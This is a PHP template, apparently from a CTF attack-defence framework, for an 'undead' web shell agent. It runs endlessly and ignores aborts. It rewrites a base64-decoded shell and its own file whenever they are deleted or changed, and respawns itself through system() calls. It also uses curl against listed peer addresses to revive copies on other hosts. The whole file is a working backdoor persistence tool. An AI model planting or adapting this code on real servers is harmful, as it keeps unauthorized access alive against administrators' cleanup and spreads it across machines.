<?php
ignore_user_abort(true);
set_time_limit(0);
$peer_addr = array({{peer_addr}});
$time_file = '/tmp/.time';

//undead shell is generated by framework,we'd better use base64 here
$undead_shell = base64_decode('{{undead_shell}}'); 
$undead_release_shell = base64_decode('{{undead_release_shell}}');

//agent shell 
$agent_shell = file_get_contents(__FILE__);

$shell_name = '{{shell_name}}';
$agent_name = __FILE__;
$agent_url = '{{agent_url}}';

function start_undead(){
    global $undead_shell,$shell_name;
    file_put_contents($shell_name, $undead_shell);
    system("php ".$shell_name);
}

function start_agent(){
    global $agent_name, $agent_shell;
    file_put_contents($agent_name, $agent_shell);
    //system("php ".$agent_shell);	
}

function check_undead(){
    global $undead_release_shell,$shell_name;
    if(file_get_contents($shell_name)!=$undead_release_shell){
	return False;
    }
    return True;
}

function check_agent(){
    global $agent_name, $agent_shell;
    if(file_get_contents($agent_name)!=$agent_shell){
	return False;
    }
    return True;
}

function check_agent_process(){
    global $agent_name;
    $outcome = shell_exec('ps -ef | grep -v grep | grep "php '.$agent_name.'"');
    if (!$outcome){
	return False;
    }
    return True;
}

function p2p_visit(){
    global $peer_addr,$agent_url;
    foreach($peer_addr as $addr){
	system('curl "http://'.$addr.$agent_url.'" -m 1 2>/dev/null');
    }
}

if(PHP_SAPI_NAME()=='cli'){
    while(True){
	if(!check_undead()){
	    echo "start undead\n";
	    start_undead();
	}
	if(!check_agent()){
	    echo "start agent\n";
	    start_agent();
	}
	p2p_visit();
	usleep(10);
    }
}else{
    if(!check_agent_process()){
	echo "\nprocess dies\n";
	system('php '.$agent_name);
    }
    echo 'OK';
}
